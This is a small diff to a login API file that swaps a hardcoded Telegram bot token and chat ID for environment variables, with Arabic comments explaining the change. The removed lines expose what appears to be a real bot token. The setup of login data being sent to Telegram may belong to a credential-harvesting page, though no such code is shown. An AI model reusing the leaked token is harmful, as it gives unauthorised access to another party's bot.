@@ -1,7 +1,11 @@
-// File: /api/login.js (Final, Cleaned, and Corrected Version)
+// File: /api/login.js (Corrected Version)
 
-const TELEGRAM_BOT_TOKEN = '8233346929:AAHRpX-fz0n3LOsCLbsCEGGEQFDF7xulTyY';
-const TELEGRAM_CHAT_ID = '6402487270';
+// اقرأ التوكن والـ ID من متغيرات البيئة
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+
+// ... باقي الكود يبقى كما هو ...
+
 
 // This function escapes special characters for Telegram's MarkdownV2.
 const escapeMarkdown = (text) => {
